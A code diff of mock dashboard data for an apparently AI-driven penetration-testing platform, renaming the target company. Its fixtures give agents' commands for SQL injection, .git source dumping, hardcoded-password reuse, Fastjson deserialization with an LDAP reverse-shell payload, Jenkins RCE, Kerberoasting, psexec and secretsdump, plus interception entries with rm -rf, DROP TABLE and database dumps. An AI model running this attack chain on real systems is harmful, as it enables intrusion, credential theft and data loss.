+      "对照 recent_facts：workG 交回 faGit「.git 可下载，git-dumper 还原出后端源码」与 faCreds「config.php 硬编码 sa/Northstar@2021（疑似内网通用）」；work#6 指纹交回 fa3「shop 命中 Fastjson 1.2.24（存在已知反序列化 RCE）」。两条【材料性新机理】：① 硬编码 DB 口令可能横跨内网复用；② Fastjson 有成熟 RCE 打法。这打开一条与现有认证/注入路线【本质不同】的入口——从 shop 直接 RCE 突破进 DMZ。先拉 faGit 详情核实产物。",
   },
   {
     seq: 1102,
@@ -1386,7 +1386,7 @@ export const activity: Activity[] = [
     tool: "node_detail",
     tool_use_id: "p1-nd",
     summary:
-      "faGit 证据：git-dumper 还原出 config.php / db.php / order_api.php；config.php 内 $db=['host'=>'10.10.10.5','user'=>'sa','pass'=>'Acme@2021']",
+      "faGit 证据：git-dumper 还原出 config.php / db.php / order_api.php；config.php 内 $db=['host'=>'10.10.10.5','user'=>'sa','pass'=>'Northstar@2021']",
     detail: "硬编码指向内网 10.10.10.5(FS01)，佐证 faCreds 的「内网通用」推断——RCE 落地后这组口令值得复用。",
   },
   {
@@ -1398,7 +1398,7 @@ export const activity: Activity[] = [
     tool_use_id: "p1-ai",
     summary: "add_intent × 2（Fastjson 突破链，串行分步先派可执行一步）",
     detail:
-      "intents=[\n  { summary: 'shop.acme.com 组件指纹深挖 + Fastjson 1.2.24 CVE 精确关联(确认 gadget 链)', asset_ids: [shop], parent_ids: [fa3], priority: 7 },\n  { summary: '构造 Fastjson 反序列化 payload 触发 shop RCE，获取反弹 shell', asset_ids: [shop], parent_ids: [fa3], priority: 9 },\n]\n注：这是强依赖串行链，已 TodoWrite 记『指纹→RCE→立足点提权』三步，本轮只派前两步（提权依赖 shell 产出，下轮再派）。",
+      "intents=[\n  { summary: 'shop.northstar.com 组件指纹深挖 + Fastjson 1.2.24 CVE 精确关联(确认 gadget 链)', asset_ids: [shop], parent_ids: [fa3], priority: 7 },\n  { summary: '构造 Fastjson 反序列化 payload 触发 shop RCE，获取反弹 shell', asset_ids: [shop], parent_ids: [fa3], priority: 9 },\n]\n注：这是强依赖串行链，已 TodoWrite 记『指纹→RCE→立足点提权』三步，本轮只派前两步（提权依赖 shell 产出，下轮再派）。",
   },
   {
     seq: 1105,
@@ -1481,7 +1481,7 @@ export const activity: Activity[] = [
     tool_use_id: "p2-ai",
     summary: "add_intent × 4（以立足点为 pivot 展开内网横向）",
     detail:
-      "intents=[\n  { summary: '以 dmz-web01 为 pivot 做内网 10.10.10.0/24 主机发现与端口识别', asset_ids: [dmz-web01], parent_ids: [fa6], priority: 8 },\n  { summary: '内网横向：复用硬编码口令 sa/Acme@2021 做凭据复用与密码喷洒', parent_ids: [faCreds], priority: 8 },\n  { summary: '内部 Jenkins(10.10.10.20) 未授权 /script Groovy 执行(RCE)', parent_ids: [fa6], priority: 9 },\n  { summary: '对域服务账号做 Kerberoasting 并离线破解', parent_ids: [fa6], priority: 8 },\n]\n主机发现是前置(先派)，其余三条是并行的横向探索维度。",
+      "intents=[\n  { summary: '以 dmz-web01 为 pivot 做内网 10.10.10.0/24 主机发现与端口识别', asset_ids: [dmz-web01], parent_ids: [fa6], priority: 8 },\n  { summary: '内网横向：复用硬编码口令 sa/Northstar@2021 做凭据复用与密码喷洒', parent_ids: [faCreds], priority: 8 },\n  { summary: '内部 Jenkins(10.10.10.20) 未授权 /script Groovy 执行(RCE)', parent_ids: [fa6], priority: 9 },\n  { summary: '对域服务账号做 Kerberoasting 并离线破解', parent_ids: [fa6], priority: 8 },\n]\n主机发现是前置(先派)，其余三条是并行的横向探索维度。",
   },
   {
     seq: 1207,
@@ -1509,7 +1509,7 @@ export const activity: Activity[] = [
     ts: T("2026-07-26T00:25:16Z"),
     kind: "thinking",
     summary:
-      "对照本轮 worker 产出：i9→fa7「内网存活 DC01/FS01/JENKINS」；i11→fa8「Jenkins /script 无鉴权 Groovy」+ fa9「从 Jenkins 凭据库导出 acme\\svc_deploy 明文口令」；i12→fa10「Kerberoast svc_sql TGS，hashcat 破出 Sql@2020」。svc_deploy 属 Domain Admins，i13 已用其 psexec 拿下 DC01 并 secretsdump。g4 验收（拿下 DC01）应已达成，先核对 finding 证据链再盖章。",
+      "对照本轮 worker 产出：i9→fa7「内网存活 DC01/FS01/JENKINS」；i11→fa8「Jenkins /script 无鉴权 Groovy」+ fa9「从 Jenkins 凭据库导出 northstar\\svc_deploy 明文口令」；i12→fa10「Kerberoast svc_sql TGS，hashcat 破出 Sql@2020」。svc_deploy 属 Domain Admins，i13 已用其 psexec 拿下 DC01 并 secretsdump。g4 验收（拿下 DC01）应已达成，先核对 finding 证据链再盖章。",
   },
   {
     seq: 1302,
@@ -1573,7 +1573,7 @@ export const activity: Activity[] = [
     ts: T("2026-07-26T03:55:14Z"),
     kind: "thinking",
     summary:
-      "对照 recent_facts：work#2 用 faCreds 里的 Acme@2021 命中 admin 后台（i2 done），后台管理权限到手——g1 验收达成，先 prove_goal 盖章。随后做【量化验收核对】：g2「读取用户敏感数据」当前只有 i3/i5 摸到接口面、尚未真正取到批量数据，实测未达标，【禁止】prove_goal，改为提优先级补足取数意图。",
+      "对照 recent_facts：work#2 用 faCreds 里的 Northstar@2021 命中 admin 后台（i2 done），后台管理权限到手——g1 验收达成，先 prove_goal 盖章。随后做【量化验收核对】：g2「读取用户敏感数据」当前只有 i3/i5 摸到接口面、尚未真正取到批量数据，实测未达标，【禁止】prove_goal，改为提优先级补足取数意图。",
   },
   {
     seq: 1402,
@@ -1584,7 +1584,7 @@ export const activity: Activity[] = [
     tool_use_id: "p4-pg",
     summary: "prove_goal(g1, evidence=fa1)",
     detail:
-      "reason：i2 用外网泄露的硬编码口令 Acme@2021 成功登入 admin 后台（Element-UI），获取后台管理权限，g1 达成。",
+      "reason：i2 用外网泄露的硬编码口令 Northstar@2021 成功登入 admin 后台（Element-UI），获取后台管理权限，g1 达成。",
   },
   {
     seq: 1403,
@@ -1612,7 +1612,7 @@ export const activity: Activity[] = [
     tool_use_id: "p4-ai",
     summary: "add_intent × 2（收敛 g2 取数，提高优先级）",
     detail:
-      "intents=[\n  { summary: '已登入 admin 后台，枚举用户管理/导出接口并批量拉取用户敏感字段', asset_ids: [admin], parent_ids: [fa1], priority: 9 },\n  { summary: 'api.acme.com 订单 IDOR 遍历 order_id 批量拉取用户订单/PII', asset_ids: [api], parent_ids: [fa2], priority: 9 },\n]\n注：i3/i5 已在 running，本轮以更精准的取数描述 + 提优先级(→9)加码，不重复派同义意图。",
+      "intents=[\n  { summary: '已登入 admin 后台，枚举用户管理/导出接口并批量拉取用户敏感字段', asset_ids: [admin], parent_ids: [fa1], priority: 9 },\n  { summary: 'api.northstar.com 订单 IDOR 遍历 order_id 批量拉取用户订单/PII', asset_ids: [api], parent_ids: [fa2], priority: 9 },\n]\n注：i3/i5 已在 running，本轮以更精准的取数描述 + 提优先级(→9)加码，不重复派同义意图。",
   },
   {
     seq: 1406,
@@ -1649,7 +1649,7 @@ export const activity: Activity[] = [
     kind: "tool_use",
     tool: "bash",
     tool_use_id: "t11",
-    summary: "subfinder -d acme.com -silent | httpx -silent -sc -title",
+    summary: "subfinder -d northstar.com -silent | httpx -silent -sc -title",
   },
   {
     seq: 12,
@@ -1660,7 +1660,7 @@ export const activity: Activity[] = [
     tool: "bash",
     tool_use_id: "t11",
     summary:
-      "www.acme.com [200] Acme Corp\nadmin.acme.com [200] Acme Admin 登录\napi.acme.com [401]\nshop.acme.com [200]\nvpn.acme.com [200]",
+      "www.northstar.com [200] Northstar Corp\nadmin.northstar.com [200] Northstar Admin 登录\napi.northstar.com [401]\nshop.northstar.com [200]\nvpn.northstar.com [200]",
     detail: "5 个存活子域，其中 admin 是后台登录页。",
   },
   {
@@ -1710,7 +1710,7 @@ export const activity: Activity[] = [
     intent_id: "i1",
     ts: T("2026-07-24T09:40:00Z"),
     kind: "result",
-    summary: "资产侦察完成，发现后台 admin.acme.com，交回图。",
+    summary: "资产侦察完成，发现后台 admin.northstar.com，交回图。",
     input_tokens: 96000,
     output_tokens: 6100,
     cache_read_tokens: 61000,
@@ -1734,7 +1734,7 @@ export const activity: Activity[] = [
     kind: "tool_use",
     tool: "bash",
     tool_use_id: "t21",
-    summary: "curl -s -d 'username=admin&password=admin' https://admin.acme.com/login -o /dev/null -w '%{http_code}'",
+    summary: "curl -s -d 'username=admin&password=admin' https://admin.northstar.com/login -o /dev/null -w '%{http_code}'",
   },
   {
     seq: 22,
@@ -1755,7 +1755,7 @@ export const activity: Activity[] = [
     kind: "tool_use",
     tool: "bash",
     tool_use_id: "t22",
-    summary: "curl -si -d 'username=admin&password=admin123' https://admin.acme.com/login",
+    summary: "curl -si -d 'username=admin&password=admin123' https://admin.northstar.com/login",
   },
   {
     seq: 24,
@@ -1776,7 +1776,7 @@ export const activity: Activity[] = [
     kind: "tool_use",
     tool: "bash",
     tool_use_id: "t23",
-    summary: "curl -s -b 'session=eyJ…' https://admin.acme.com/dashboard | grep -o '<title>[^<]*'",
+    summary: "curl -s -b 'session=eyJ…' https://admin.northstar.com/dashboard | grep -o '<title>[^<]*'",
   },
   {
     seq: 26,
@@ -1786,7 +1786,7 @@ export const activity: Activity[] = [
     kind: "tool_result",
     tool: "bash",
     tool_use_id: "t23",
-    summary: "<title>Acme Admin · 控制台",
+    summary: "<title>Northstar Admin · 控制台",
     detail: "确认已进入后台控制台。",
   },
   {
@@ -1839,7 +1839,7 @@ export const activity: Activity[] = [
     kind: "tool_use",
     tool: "bash",
     tool_use_id: "t41",
-    summary: "curl -s \"https://www.acme.com/search?q=1'\" | grep -i 'sql\\|syntax'",
+    summary: "curl -s \"https://www.northstar.com/search?q=1'\" | grep -i 'sql\\|syntax'",
   },
   {
     seq: 42,
@@ -1860,7 +1860,7 @@ export const activity: Activity[] = [
     kind: "tool_use",
     tool: "bash",
     tool_use_id: "t42",
-    summary: "sqlmap -u 'https://www.acme.com/search?q=1' --batch --dbs --level 2",
+    summary: "sqlmap -u 'https://www.northstar.com/search?q=1' --batch --dbs --level 2",
   },
   {
     seq: 44,
@@ -1871,7 +1871,7 @@ export const activity: Activity[] = [
     tool: "bash",
     tool_use_id: "t42",
     summary:
-      "Parameter: q (GET) — error-based, MSSQL\navailable databases [4]: acme_prod, information_schema, master, tempdb",
+      "Parameter: q (GET) — error-based, MSSQL\navailable databases [4]: northstar_prod, information_schema, master, tempdb",
     detail: "确认可注入，枚举出 4 个库。",
   },
   {
@@ -1924,7 +1924,7 @@ export const activity: Activity[] = [
     kind: "tool_use",
     tool: "bash",
     tool_use_id: "t51",
-    summary: "curl -s -H 'Authorization: Bearer <self>' https://api.acme.com/v1/orders?id=1001",
+    summary: "curl -s -H 'Authorization: Bearer <self>' https://api.northstar.com/v1/orders?id=1001",
   },
   {
     seq: 52,
@@ -1945,7 +1945,7 @@ export const activity: Activity[] = [
     kind: "tool_use",
     tool: "bash",
     tool_use_id: "t52",
-    summary: "curl -s -H 'Authorization: Bearer <self>' https://api.acme.com/v1/orders?id=1002",
+    summary: "curl -s -H 'Authorization: Bearer <self>' https://api.northstar.com/v1/orders?id=1002",
   },
   {
     seq: 54,
@@ -2004,7 +2004,7 @@ export const activity: Activity[] = [
     kind: "tool_use",
     tool: "bash",
     tool_use_id: "t61",
-    summary: "curl -s -b 'session=eyJ…' https://admin.acme.com/api/users?page=1",
+    summary: "curl -s -b 'session=eyJ…' https://admin.northstar.com/api/users?page=1",
   },
   {
     seq: 62,
@@ -2014,7 +2014,7 @@ export const activity: Activity[] = [
     kind: "tool_result",
     tool: "bash",
     tool_use_id: "t61",
-    summary: '{ "total": 12840, "items": [ { "id":1, "email":"a***@acme.com", "phone":"139****" } ] }',
+    summary: '{ "total": 12840, "items": [ { "id":1, "email":"a***@northstar.com", "phone":"139****" } ] }',
     detail: "管理接口可分页返回全部用户（含邮箱/手机号），约 1.28 万条。",
   },
   {
@@ -2043,7 +2043,7 @@ export const activity: Activity[] = [
     kind: "tool_use",
     tool: "bash",
     tool_use_id: "tg1",
-    summary: "curl -s -o /dev/null -w '%{http_code}' https://www.acme.com/.git/HEAD",
+    summary: "curl -s -o /dev/null -w '%{http_code}' https://www.northstar.com/.git/HEAD",
   },
   {
     seq: 312,
@@ -2064,7 +2064,7 @@ export const activity: Activity[] = [
     kind: "tool_use",
     tool: "bash",
     tool_use_id: "tg2",
-    summary: "git-dumper https://www.acme.com/.git/ /tmp/acme && git -C /tmp/acme log --oneline | head",
+    summary: "git-dumper https://www.northstar.com/.git/ /tmp/northstar && git -C /tmp/northstar log --oneline | head",
   },
   {
     seq: 314,
@@ -2075,7 +2075,7 @@ export const activity: Activity[] = [
     tool: "bash",
     tool_use_id: "tg2",
     summary: "还原 214 个文件；HEAD=main。config.php / db.php 在列。",
-    detail: "完整后端源码已还原到 /tmp/acme。",
+    detail: "完整后端源码已还原到 /tmp/northstar。",
   },
   {
     seq: 315,
@@ -2085,7 +2085,7 @@ export const activity: Activity[] = [
     kind: "tool_use",
     tool: "bash",
     tool_use_id: "tg3",
-    summary: "grep -rniE 'password|pwd|secret|Data Source' /tmp/acme/config.php",
+    summary: "grep -rniE 'password|pwd|secret|Data Source' /tmp/northstar/config.php",
   },
   {
     seq: 316,
@@ -2095,7 +2095,7 @@ export const activity: Activity[] = [
     kind: "tool_result",
     tool: "bash",
     tool_use_id: "tg3",
-    summary: "$db_user='sa'; $db_pass='Acme@2021'; $db_host='10.10.10.30';",
+    summary: "$db_user='sa'; $db_pass='Northstar@2021'; $db_host='10.10.10.30';",
     detail: "硬编码数据库口令，且 host 指向内网 IP —— 记为疑似内网通用凭据。",
   },
   {
@@ -2118,7 +2118,7 @@ export const activity: Activity[] = [
     intent_id: "i6",
     ts: T("2026-07-25T14:22:00Z"),
     kind: "thinking",
-    summary: "shop.acme.com 是自研电商，先指纹识别框架/组件版本，再对存在已知反序列化的组件下手。",
+    summary: "shop.northstar.com 是自研电商，先指纹识别框架/组件版本，再对存在已知反序列化的组件下手。",
   },
   {
     seq: 321,
@@ -2128,7 +2128,7 @@ export const activity: Activity[] = [
     kind: "tool_use",
     tool: "bash",
     tool_use_id: "t6a",
-    summary: "curl -si https://shop.acme.com/ | grep -iE 'x-powered-by|server|jsessionid'",
+    summary: "curl -si https://shop.northstar.com/ | grep -iE 'x-powered-by|server|jsessionid'",
   },
   {
     seq: 322,
@@ -2150,7 +2150,7 @@ export const activity: Activity[] = [
     tool: "bash",
     tool_use_id: "t6b",
     summary:
-      'curl -s -H \'Content-Type: application/json\' -d \'{"a":{"@type":"java.lang.AutoCloseable"}}\' https://shop.acme.com/api/import',
+      'curl -s -H \'Content-Type: application/json\' -d \'{"a":{"@type":"java.lang.AutoCloseable"}}\' https://shop.northstar.com/api/import',
   },
   {
     seq: 324,
@@ -2215,7 +2215,7 @@ export const activity: Activity[] = [
     tool: "bash",
     tool_use_id: "t7b",
     summary:
-      'curl -s -H \'Content-Type: application/json\' -d \'{"@type":"com.sun.rowset.JdbcRowSetImpl","dataSourceName":"ldap://<vps>:1389/Basic/ReverseShell/<vps>/4444","autoCommit":true}\' https://shop.acme.com/api/import',
+      'curl -s -H \'Content-Type: application/json\' -d \'{"@type":"com.sun.rowset.JdbcRowSetImpl","dataSourceName":"ldap://<vps>:1389/Basic/ReverseShell/<vps>/4444","autoCommit":true}\' https://shop.northstar.com/api/import',
   },
   {
     seq: 334,
@@ -2396,7 +2396,7 @@ export const activity: Activity[] = [
     intent_id: "i10",
     ts: T("2026-07-26T03:42:00Z"),
     kind: "thinking",
-    summary: "源码泄露的 sa/Acme@2021 是 DB 口令，企业常见口令复用。对 DC01/FS01/JENKINS 做密码喷洒。",
+    summary: "源码泄露的 sa/Northstar@2021 是 DB 口令，企业常见口令复用。对 DC01/FS01/JENKINS 做密码喷洒。",
   },
   {
     seq: 361,
@@ -2406,7 +2406,7 @@ export const activity: Activity[] = [
     kind: "tool_use",
     tool: "bash",
     tool_use_id: "t10a",
-    summary: "crackmapexec smb 10.10.10.5 10.10.10.10 -u sa -p 'Acme@2021'",
+    summary: "crackmapexec smb 10.10.10.5 10.10.10.10 -u sa -p 'Northstar@2021'",
   },
   {
     seq: 362,
@@ -2416,7 +2416,7 @@ export const activity: Activity[] = [
     kind: "tool_result",
     tool: "bash",
     tool_use_id: "t10a",
-    summary: "FS01 [+] acme.local\\sa:Acme@2021 (Pwn3d!)\nDC01 [-] 认证失败",
+    summary: "FS01 [+] northstar.local\\sa:Northstar@2021 (Pwn3d!)\nDC01 [-] 认证失败",
     detail: "FS01 上 sa 口令复用成功且有管理员权限；DC01 不通。",
   },
   {
@@ -2497,7 +2497,7 @@ export const activity: Activity[] = [
     kind: "tool_result",
     tool: "bash",
     tool_use_id: "t11c",
-    summary: "acme\\svc_deploy : Deploy@Acme2024\nacme\\svc_build : Build#2023!",
+    summary: "northstar\\svc_deploy : Deploy@Northstar2024\nnorthstar\\svc_build : Build#2023!",
     detail: "两个域服务账号明文口令导出。",
   },
   {
@@ -2540,7 +2540,7 @@ export const activity: Activity[] = [
     kind: "tool_use",
     tool: "bash",
     tool_use_id: "t12a",
-    summary: "impacket-GetUserSPNs acme.local/svc_deploy:'Deploy@Acme2024' -dc-ip 10.10.10.10 -request",
+    summary: "impacket-GetUserSPNs northstar.local/svc_deploy:'Deploy@Northstar2024' -dc-ip 10.10.10.10 -request",
   },
   {
     seq: 382,
@@ -2550,7 +2550,7 @@ export const activity: Activity[] = [
     kind: "tool_result",
     tool: "bash",
     tool_use_id: "t12a",
-    summary: "svc_sql  MSSQLSvc/db01.acme.local:1433  $krb5tgs$23$*svc_sql$...",
+    summary: "svc_sql  MSSQLSvc/db01.northstar.local:1433  $krb5tgs$23$*svc_sql$...",
     detail: "拿到 svc_sql 的 TGS 票据（Kerberos RC4）。",
   },
   {
@@ -2614,7 +2614,7 @@ export const activity: Activity[] = [
     kind: "tool_use",
     tool: "bash",
     tool_use_id: "t13a",
-    summary: "net rpc group members 'Domain Admins' -U 'acme.local/svc_deploy%Deploy@Acme2024' -S 10.10.10.10",
+    summary: "net rpc group members 'Domain Admins' -U 'northstar.local/svc_deploy%Deploy@Northstar2024' -S 10.10.10.10",
   },
   {
     seq: 392,
@@ -2624,7 +2624,7 @@ export const activity: Activity[] = [
     kind: "tool_result",
     tool: "bash",
     tool_use_id: "t13a",
-    summary: "ACME\\Administrator\nACME\\svc_deploy",
+    summary: "NORTHSTAR\\Administrator\nNORTHSTAR\\svc_deploy",
     detail: "svc_deploy 是 Domain Admins 成员。",
   },
   {
@@ -2635,7 +2635,7 @@ export const activity: Activity[] = [
     kind: "tool_use",
     tool: "bash",
     tool_use_id: "t13b",
-    summary: "impacket-psexec acme.local/svc_deploy:'Deploy@Acme2024'@10.10.10.10",
+    summary: "impacket-psexec northstar.local/svc_deploy:'Deploy@Northstar2024'@10.10.10.10",
   },
   {
     seq: 394,
@@ -2656,7 +2656,7 @@ export const activity: Activity[] = [
     kind: "tool_use",
     tool: "bash",
     tool_use_id: "t13c",
-    summary: "impacket-secretsdump acme.local/svc_deploy:'Deploy@Acme2024'@10.10.10.10 -just-dc",
+    summary: "impacket-secretsdump northstar.local/svc_deploy:'Deploy@Northstar2024'@10.10.10.10 -just-dc",
   },
   {
     seq: 396,
@@ -2700,7 +2700,7 @@ export const activity: Activity[] = [
     ts: T("2026-07-26T03:18:06Z"),
     kind: "text",
     summary:
-      "admin.acme.com 是 Element-UI 后台，无验证码、无速率限制。建议先默认口令表(admin/admin123)再上字典。我已注入一条高优意图给 work agent。",
+      "admin.northstar.com 是 Element-UI 后台，无验证码、无速率限制。建议先默认口令表(admin/admin123)再上字典。我已注入一条高优意图给 work agent。",
   },
   { seq: 72, worker: "mainagent", ts: T("2026-07-26T03:52:00Z"), kind: "user", summary: "拿到后台了，接下来重点？" },
   {
@@ -2860,22 +2860,22 @@ export const convTokens: ConvTokenSummary[] = [
 
 // ── Traffic ──────────────────────────────────────────────────────────────────
 const exchanges = [
-  ["x-1", "www.acme.com", "GET", "https://www.acme.com/", 200, "text/html", 48213],
-  ["x-2", "www.acme.com", "GET", "https://www.acme.com/search?q=test", 200, "text/html", 5120],
-  ["x-3", "www.acme.com", "GET", "https://www.acme.com/.git/HEAD", 200, "text/plain", 23],
-  ["x-4", "admin.acme.com", "GET", "https://admin.acme.com/login", 200, "text/html", 12044],
-  ["x-5", "admin.acme.com", "POST", "https://admin.acme.com/login", 302, "text/html", 0],
-  ["x-6", "admin.acme.com", "GET", "https://admin.acme.com/dashboard", 200, "text/html", 33120],
-  ["x-7", "admin.acme.com", "GET", "https://admin.acme.com/api/users?page=1", 200, "application/json", 8842],
-  ["x-8", "api.acme.com", "GET", "https://api.acme.com/v1/orders?id=1001", 200, "application/json", 640],
-  ["x-9", "api.acme.com", "GET", "https://api.acme.com/v1/orders?id=1002", 200, "application/json", 655],
-  ["x-10", "api.acme.com", "GET", "https://api.acme.com/v1/users/me", 200, "application/json", 312],
-  ["x-11", "api.acme.com", "GET", "https://api.acme.com/v1/admin", 401, "application/json", 45],
-  ["x-12", "shop.acme.com", "GET", "https://shop.acme.com/checkout", 200, "text/html", 21990],
-  ["x-13", "shop.acme.com", "POST", "https://shop.acme.com/pay", 200, "application/json", 128],
-  ["x-14", "www.acme.com", "GET", "https://www.acme.com/robots.txt", 200, "text/plain", 88],
-  ["x-15", "shop.acme.com", "POST", "https://shop.acme.com/api/import", 500, "application/json", 2048],
-  ["x-16", "shop.acme.com", "POST", "https://shop.acme.com/api/import", 200, "application/json", 0],
+  ["x-1", "www.northstar.com", "GET", "https://www.northstar.com/", 200, "text/html", 48213],
+  ["x-2", "www.northstar.com", "GET", "https://www.northstar.com/search?q=test", 200, "text/html", 5120],
+  ["x-3", "www.northstar.com", "GET", "https://www.northstar.com/.git/HEAD", 200, "text/plain", 23],
+  ["x-4", "admin.northstar.com", "GET", "https://admin.northstar.com/login", 200, "text/html", 12044],
+  ["x-5", "admin.northstar.com", "POST", "https://admin.northstar.com/login", 302, "text/html", 0],
+  ["x-6", "admin.northstar.com", "GET", "https://admin.northstar.com/dashboard", 200, "text/html", 33120],
+  ["x-7", "admin.northstar.com", "GET", "https://admin.northstar.com/api/users?page=1", 200, "application/json", 8842],
+  ["x-8", "api.northstar.com", "GET", "https://api.northstar.com/v1/orders?id=1001", 200, "application/json", 640],
+  ["x-9", "api.northstar.com", "GET", "https://api.northstar.com/v1/orders?id=1002", 200, "application/json", 655],
+  ["x-10", "api.northstar.com", "GET", "https://api.northstar.com/v1/users/me", 200, "application/json", 312],
+  ["x-11", "api.northstar.com", "GET", "https://api.northstar.com/v1/admin", 401, "application/json", 45],
+  ["x-12", "shop.northstar.com", "GET", "https://shop.northstar.com/checkout", 200, "text/html", 21990],
+  ["x-13", "shop.northstar.com", "POST", "https://shop.northstar.com/pay", 200, "application/json", 128],
+  ["x-14", "www.northstar.com", "GET", "https://www.northstar.com/robots.txt", 200, "text/plain", 88],
+  ["x-15", "shop.northstar.com", "POST", "https://shop.northstar.com/api/import", 500, "application/json", 2048],
+  ["x-16", "shop.northstar.com", "POST", "https://shop.northstar.com/api/import", 200, "application/json", 0],
   ["x-17", "10.10.10.20", "GET", "http://10.10.10.20:8080/script", 200, "text/html", 14200],
   ["x-18", "10.10.10.20", "POST", "http://10.10.10.20:8080/scriptText", 200, "text/plain", 86],
   ["x-19", "10.10.10.10", "POST", "https://10.10.10.10:445/psexec", 200, "application/octet-stream", 0],
@@ -2907,7 +2907,7 @@ export const trafficHosts: TrafficHost[] = Object.entries(hostCounts).map(([host
 
 export const trafficDetail: TrafficDetail = {
   req: `GET /v1/orders?id=1002 HTTP/1.1
-Host: api.acme.com
+Host: api.northstar.com
 Authorization: Bearer eyJhbGciOiJIUzI1NiJ9...
 User-Agent: 4zrec-worker/1.0
 Accept: application/json
@@ -2935,13 +2935,13 @@ export const audit: Audit = {
       ts: T("2026-07-26T03:33:00Z"),
       tool: "bash",
       action: "allow",
-      command: "curl -s -d 'username=admin...' https://admin.acme.com/login",
+      command: "curl -s -d 'username=admin...' https://admin.northstar.com/login",
     },
     {
       ts: T("2026-07-26T03:57:00Z"),
       tool: "bash",
       action: "allow",
-      command: "curl -s -b 'session=...' https://admin.acme.com/api/users",
+      command: "curl -s -b 'session=...' https://admin.northstar.com/api/users",
     },
     {
       ts: T("2026-07-26T02:10:00Z"),
@@ -2954,7 +2954,7 @@ export const audit: Audit = {
       ts: T("2026-07-25T22:03:00Z"),
       tool: "bash",
       action: "allow",
-      command: "sqlmap -u 'https://www.acme.com/search?q=1' --batch",
+      command: "sqlmap -u 'https://www.northstar.com/search?q=1' --batch",
     },
     {
       ts: T("2026-07-25T21:00:00Z"),
@@ -2967,14 +2967,14 @@ export const audit: Audit = {
       ts: T("2026-07-25T20:30:00Z"),
       tool: "bash",
       action: "allow",
-      command: "git-dumper https://www.acme.com/.git/ /tmp/acme",
+      command: "git-dumper https://www.northstar.com/.git/ /tmp/northstar",
     },
     {
       ts: T("2026-07-25T15:20:00Z"),
       tool: "bash",
       action: "allow",
       command:
-        "curl -s -H 'Content-Type: application/json' -d '{\"@type\":\"com.sun.rowset.JdbcRowSetImpl\"...}' https://shop.acme.com/api/import",
+        "curl -s -H 'Content-Type: application/json' -d '{\"@type\":\"com.sun.rowset.JdbcRowSetImpl\"...}' https://shop.northstar.com/api/import",
     },
     {
       ts: T("2026-07-25T21:40:00Z"),
@@ -2986,20 +2986,20 @@ export const audit: Audit = {
       ts: T("2026-07-26T00:00:00Z"),
       tool: "bash",
       action: "allow",
-      command: "impacket-psexec acme.local/svc_deploy@10.10.10.10",
+      command: "impacket-psexec northstar.local/svc_deploy@10.10.10.10",
     },
     {
       ts: T("2026-07-26T00:05:00Z"),
       tool: "bash",
       action: "block",
       reason: "数据外泄门控：secretsdump 需人工审批",
-      command: "impacket-secretsdump acme.local/svc_deploy@10.10.10.10 -just-dc",
+      command: "impacket-secretsdump northstar.local/svc_deploy@10.10.10.10 -just-dc",
     },
     {
       ts: T("2026-07-26T00:06:00Z"),
       tool: "bash",
       action: "allow",
-      command: "impacket-secretsdump acme.local/svc_deploy@10.10.10.10 -just-dc  # 已审批放行",
+      command: "impacket-secretsdump northstar.local/svc_deploy@10.10.10.10 -just-dc  # 已审批放行",
     },
   ],
 };
@@ -3146,7 +3146,7 @@ export const agents: Agent[] = [
 ];
 
 const promptVars: PromptVar[] = [
-  { name: "Goal", description: "当前任务目标", example: "拿到 acme.com 后台管理权限", source: "runtime" },
+  { name: "Goal", description: "当前任务目标", example: "拿到 northstar.com 后台管理权限", source: "runtime" },
   { name: "AssetSummary", description: "资产图概览", example: "6 子域 / 3 IP / 4 应用 / 4 端点", source: "distilled" },
   { name: "RouteHint", description: "探索路线提示", example: "优先后台与 API 越权面", source: "exploration" },
 ];
@@ -3429,10 +3429,10 @@ export const interceptPending: InterceptPending[] = [
   {
     id: 101,
     rule_id: 1,
-    task_id: "t-acme-web",
+    task_id: "t-northstar-web",
     agent_name: "work#3",
     tool_name: "bash",
-    tool_input: { command: "mysqldump -h 203.0.113.10 -uroot acme_prod > /tmp/dump.sql" },
+    tool_input: { command: "mysqldump -h 203.0.113.10 -uroot northstar_prod > /tmp/dump.sql" },
     status: "pending",
     reason: "数据外泄门控：整库导出需人工审批",
     created_at: T("2026-07-26T03:58:00Z"),
@@ -3443,7 +3443,7 @@ export const interceptHistory: InterceptApprovalRow[] = [
   {
     id: 90,
     rule_id: 1,
-    task_id: "t-acme-web",
+    task_id: "t-northstar-web",
     agent_name: "work#1",
     tool_name: "bash",
     tool_input: { command: "dd if=/dev/zero of=/tmp/x" },
@@ -3457,7 +3457,7 @@ export const interceptHistory: InterceptApprovalRow[] = [
   },
   {
     id: 91,
-    task_id: "t-acme-api",
+    task_id: "t-northstar-api",
     agent_name: "work#2",
     tool_name: "bash",
     tool_input: { command: "rm -rf /var/www/html" },
@@ -3472,10 +3472,10 @@ export const interceptHistory: InterceptApprovalRow[] = [
   {
     id: 92,
     rule_id: 2,
-    task_id: "t-acme-web",
+    task_id: "t-northstar-web",
     agent_name: "work#13",
     tool_name: "bash",
-    tool_input: { command: "impacket-secretsdump acme.local/svc_deploy@10.10.10.10 -just-dc" },
+    tool_input: { command: "impacket-secretsdump northstar.local/svc_deploy@10.10.10.10 -just-dc" },
     status: "allowed",
     reason: "外发流量直接拒绝",
     created_at: T("2026-07-26T00:05:00Z"),
@@ -3486,7 +3486,7 @@ export const interceptHistory: InterceptApprovalRow[] = [
   },
   {
     id: 93,
-    task_id: "t-acme-web",
+    task_id: "t-northstar-web",
     agent_name: "work#7",
     tool_name: "bash",
     tool_input: { command: 'mysql -e "DROP TABLE users_bak_0921"' },
@@ -3502,7 +3502,7 @@ export const interceptHistory: InterceptApprovalRow[] = [
 // Approval detail fixtures use harmless report-writing examples.
 interceptHistory.unshift({
   id: 94,
-  task_id: "t-acme-web",
+  task_id: "t-northstar-web",
   agent_name: "work#1",
   tool_name: "Write",
   tool_input: { path: "reports/summary.md", content: "# 检查摘要\n\n本轮验证已完成，整理已有证据与后续建议。" },
@@ -3568,7 +3568,7 @@ export const conversations: Conversation[] = [
   {
     id: 1,
     agent_key: "mainagent",
-    title: "acme 后台切入点讨论",
+    title: "northstar 后台切入点讨论",
     llm_profile_id: 1,
     pinned: true,
     pinned_at: T("2026-07-26T04:00:00Z"),
@@ -3601,7 +3601,7 @@ export const conversationMessages: Record<number, Activity[]> = {
       worker: "mainagent",
       ts: T("2026-07-25T10:00:04Z"),
       kind: "thinking",
-      summary: "先确认 admin.acme.com 的登录页技术栈和防护（验证码/速率限制），再决定用默认口令还是字典。",
+      summary: "先确认 admin.northstar.com 的登录页技术栈和防护（验证码/速率限制），再决定用默认口令还是字典。",
